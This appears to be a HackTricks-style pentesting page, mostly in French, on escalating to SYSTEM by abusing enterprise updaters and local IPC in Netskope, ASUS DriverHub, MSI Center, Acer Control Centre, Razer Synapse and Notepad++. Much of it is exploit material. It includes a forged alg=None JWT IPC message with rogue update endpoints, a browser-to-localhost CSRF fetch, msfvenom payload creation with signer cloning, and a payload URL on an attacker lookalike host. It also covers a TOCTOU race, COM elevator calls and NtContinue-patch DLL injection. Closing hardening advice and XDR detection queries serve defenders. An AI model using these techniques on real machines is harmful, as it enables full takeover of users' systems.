# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes d'élévation de privilèges locales Windows trouvées dans des agents endpoint et updaters d'entreprise qui exposent une surface IPC à faible friction et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à faibles privilèges peut forcer l'enrôlement vers un serveur contrôlé par l'attaquant puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés réutilisables contre des produits similaires :
- Abuser de l'IPC localhost d'un service privilégié pour forcer la ré-enrôlement ou la reconfiguration vers un serveur attaquant.
- Implémenter les endpoints de mise à jour du vendor, livrer une Trusted Root CA rogue, et pointer l'updater vers un package malveillant « signé ».
- Éviter des vérifications de signataire faibles (CN allow-lists), des flags de digest optionnels, et des propriétés laxistes des MSI.
- Si l'IPC est « chiffré », dériver la clé/IV à partir d'identifiants machine lisibles par tous stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injecter dans un processus allow-listé ou en créer un suspendu et bootstrapper votre DLL via un patch minimal du thread-context.

---
## 1) Forcer l'enrôlement vers un serveur attaquant via l'IPC localhost

Beaucoup d'agents fournissent un processus UI en mode utilisateur qui dialogue avec un service SYSTEM sur localhost via TCP en utilisant JSON.

Observé dans Netskope :
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow :
1) Construire un jeton d'enrôlement JWT dont les claims contrôlent l'hôte backend (par ex., AddonUrl). Utiliser alg=None de sorte qu'aucune signature ne soit requise.
2) Envoyer le message IPC invoquant la commande de provisioning avec votre JWT et le nom du tenant :
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre serveur malveillant pour enrollment/config, par ex. :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l'appelant est basée sur le chemin/le nom, effectuez la requête depuis un binaire fournisseur autorisé (voir §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Retournez une config JSON avec un intervalle de mise à jour très court, p.ex. :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA au format PEM. Le service l'installe dans le magasin Trusted Root de la machine locale.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une version factice.

Bypass des vérifications courantes observées sur le terrain :
- Liste d'autorisation CN du signataire : le service peut seulement vérifier que le Subject CN est égal à “netSkope Inc” ou “Netskope, Inc.”. Votre CA malveillante peut émettre un certificat leaf avec ce CN et signer le MSI.
- CERT_DIGEST property : inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune vérification appliquée lors de l'installation.
- Application optionnelle du digest : un flag de config (p.ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Depuis R127, Netskope encapsulait le JSON IPC dans un champ encryptData qui ressemble à du Base64. L'analyse inverse a révélé AES avec clé/IV dérivés de valeurs de registre lisibles par n'importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard. Astuce générale : si un agent commence soudainement à « chiffrer » son IPC, cherchez des device IDs, des product GUIDs, des install IDs sous HKLM comme matériel.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Certains services tentent d'authentifier le pair en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l'image avec des binaires du fournisseur sur liste blanche situés sous Program Files (p.ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- Injection de DLL dans un processus sur liste blanche (p.ex., nsdiag.exe) et faire transiter l'IPC depuis l'intérieur.
- Lancer un binaire sur liste blanche suspendu et bootstrapper votre DLL de proxy sans CreateRemoteThread (voir §5) pour satisfaire les règles anti-tamper appliquées par le driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Les produits intègrent souvent un driver minifilter/OB callbacks (p.ex., Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
- Process : supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : restreint à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un chargeur en mode utilisateur fiable qui respecte ces contraintes :
1) CreateProcess d'un binaire du fournisseur avec CREATE_SUSPENDED.
2) Obtenir les handles que vous êtes encore autorisé à avoir : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou juste THREAD_RESUME si vous modifiez le code à une RIP connue).
3) Écraser ntdll!NtContinue (ou un autre thunk mappé tôt et garanti) par un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis revient.
4) ResumeThread pour déclencher votre stub en processus, chargeant votre DLL.

Comme vous n'avez jamais utilisé PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l'avez créé), la politique du driver est satisfaite.

---
## 6) Practical tooling
- NachoVPN (plugin Netskope) automatise une CA malveillante, la signature de MSI malveillants, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC personnalisé qui façonne des messages IPC arbitraires (optionnellement chiffrés AES) et inclut l'injection via processus suspendu pour provenir d'un binaire sur liste blanche.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Face à un nouvel agent endpoint ou une suite “helper” de la carte mère, un flux rapide suffit généralement à déterminer si vous avez une cible privesc prometteuse :

1) Énumérer les écouteurs loopback et les mapper vers les processus du fournisseur :
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Énumérer les named pipes candidates :
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraire les données de routage stockées dans le registre utilisées par les serveurs IPC basés sur des plugins :
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraire d'abord les noms d'endpoint, les clés JSON et les IDs de commande depuis le client en mode utilisateur. Les frontends Packed Electron/.NET leak fréquemment le schéma complet :
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF contre les API HTTP privilégiées (ASUS DriverHub)

DriverHub fournit un service HTTP en user-mode (ADU.exe) sur `127.0.0.1:53000` qui attend des appels du navigateur provenant de https://driverhub.asus.com. Le filtre d'Origin effectue simplement `string_contains(".asus.com")` sur l'en-tête Origin et sur les URLs de téléchargement exposées par `/asus/v1.0/*`. Tout hôte contrôlé par un attaquant, comme `https://driverhub.asus.com.attacker.tld`, passe donc le contrôle et peut émettre des requêtes modifiant l'état depuis JavaScript. Voir [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) pour des motifs de contournement supplémentaires.

Practical flow:
1) Enregistrer un domaine qui inclut `.asus.com` et y héberger une page web malveillante.
2) Utiliser `fetch` ou XHR pour appeler un endpoint privilégié (par ex., `Reboot`, `UpdateApp`) sur `http://127.0.0.1:53000`.
3) Envoyer le corps JSON attendu par le handler – le frontend JS packagé montre le schéma ci-dessous.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Même le PowerShell CLI montré ci-dessous réussit lorsque l'en-tête Origin est spoofed à la valeur de confiance :
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Conclusion générale : lorsque vous révisez des suites "helper", ne vous arrêtez pas au TCP localhost ou aux named pipes. Vérifiez l'existence de classes COM portant des noms tels que `Elevator`, `Launcher`, `Updater` ou `Utility`, puis vérifiez si le service privilégié valide réellement le binaire cible lui-même ou se contente de faire confiance à un résultat calculé par une DLL cliente en espace utilisateur qui peut être patchée. Ce schéma se généralise au-delà de Razer : tout design scindé où le broker haute-privilege consomme une décision allow/deny depuis le côté basse-privilege constitue une surface candidate pour privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Les anciens updaters Notepad++ basés sur WinGUp ne vérifiaient pas complètement l'authenticité des mises à jour. Quand des attaquants compromettaient le fournisseur d'hébergement du serveur de mise à jour, ils pouvaient altérer le XML manifest et rediriger seulement certains clients vers des URL contrôlées par l'attaquant. Parce que le client acceptait n'importe quelle réponse HTTPS sans imposer à la fois une chaîne de certificats de confiance et une signature PE valide, les victimes récupéraient et exécutaient un NSIS trojanisé `update.exe`.

Flux opérationnel (aucun exploit local requis) :
1. **Infrastructure interception** : compromettre le CDN/l'hébergement et répondre aux vérifications de mise à jour avec des métadonnées d'attaquant pointant vers une URL de téléchargement malveillante.
2. **Trojanized NSIS** : l'installateur récupère/exécute une charge utile et abuse de deux chaînes d'exécution :
- **Bring-your-own signed binary + sideload** : empaqueter le `BluetoothService.exe` signé par Bitdefender et déposer un `log.dll` malveillant dans son chemin de recherche. Lorsque le binaire signé s'exécute, Windows sideloads `log.dll`, qui décrypte et charge de manière reflective le backdoor Chrysalis (protégé par Warbird + hachage d'API pour compliquer la détection statique).
- **Scripted shellcode injection** : NSIS exécute un script Lua compilé qui utilise des Win32 APIs (p. ex. `EnumWindowStationsW`) pour injecter du shellcode et préparer la mise en place de Cobalt Strike Beacon.

Enseignements pour hardening/détection de tout auto-updater :
- Appliquer une **vérification certificat + signature** de l'installateur téléchargé (épinglez le signataire fournisseur, rejetez les CN/chaines non correspondantes) et signer le manifest de mise à jour lui-même (p. ex. XMLDSig). Bloquer les redirections contrôlées par le manifest sauf si elles sont validées.
- Traiter le **BYO signed binary sideloading** comme un pivot de détection post-téléchargement : alerter lorsqu'un EXE signé fournisseur charge un nom de DLL depuis en dehors de son chemin d'installation canonique (p. ex. Bitdefender chargeant `log.dll` depuis Temp/Downloads) et lorsqu'un updater dépose/exécute des installateurs depuis Temp avec des signatures non-fournisseur.
- Surveiller les **artifacts spécifiques au malware** observés dans cette chaîne (utiles comme pivots génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` vers `%TEMP%`, et étapes d'injection de shellcode pilotées par Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ces schémas se généralisent à tout updater qui accepte des unsigned manifests ou qui ne vérifie pas les installer signers — network hijack + malicious installer + BYO-signed sideloading entraînent remote code execution sous couvert de mises à jour “trusted”.

---
## Références
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
